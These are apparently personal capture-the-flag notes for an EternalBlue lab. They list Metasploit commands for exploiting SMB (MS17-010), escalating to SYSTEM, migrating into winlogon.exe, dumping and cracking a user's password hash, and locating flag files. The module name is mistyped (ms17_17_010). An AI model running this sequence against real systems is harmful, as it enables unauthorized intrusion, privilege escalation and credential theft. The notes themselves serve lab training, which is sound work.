#EternalBlue

--------
Data: 10.09.2020
IP:`10.10.244.37`


Data: 11.09.2020
IP: `10.10.97.107 `

#Steps

1. nmap -sC -sV -vv --script vuln -oN nmap/nmap_first <IP>

2.metasploit
	- db_nmap
	- use exploit/windows/smb/ms17_17_010_eternalblue
	- show options
	- set RHOST <IP>
	- run
	- CTRL+Z - move to backgroung
------------
	ESCALATE
------------
	- use shell_to_meterpreter
	- set SESSION 1
	- sessions -u 1
------------
	- session -i 2
	- getuid
	- getsystem
	- shell
		- whoami
		- ctrl+c
	- ps
	- migrate -N winlogon.exe (or other PID, -p <PID>)
------------
	- hashdump
		- user: Jon
		- hashpass: ffb43f0de35be4d9917ac0cc8ad57f8d


3. use fe. crackstation to crack the password
	- pass: alqfna22
4. Flags:
	in metasploit!
	- flag1:
		- cd c:/
		- dri
		- cat flag1.txt
	- flag2:
		- cd c:/windows/system32/config
		- dir
		- cat flag2.txt
	- flag3:
		- search -f flag*.txt
		###
		Found 3 results...
    		c:\flag1.txt (24 bytes)
    		c:\Users\Jon\Documents\flag3.txt (37 bytes)
    		c:\Windows\System32\config\flag2.txt (34 bytes)
    	###
    	- cat c:\\Users\\Jon\\Documents\\flag3.txt


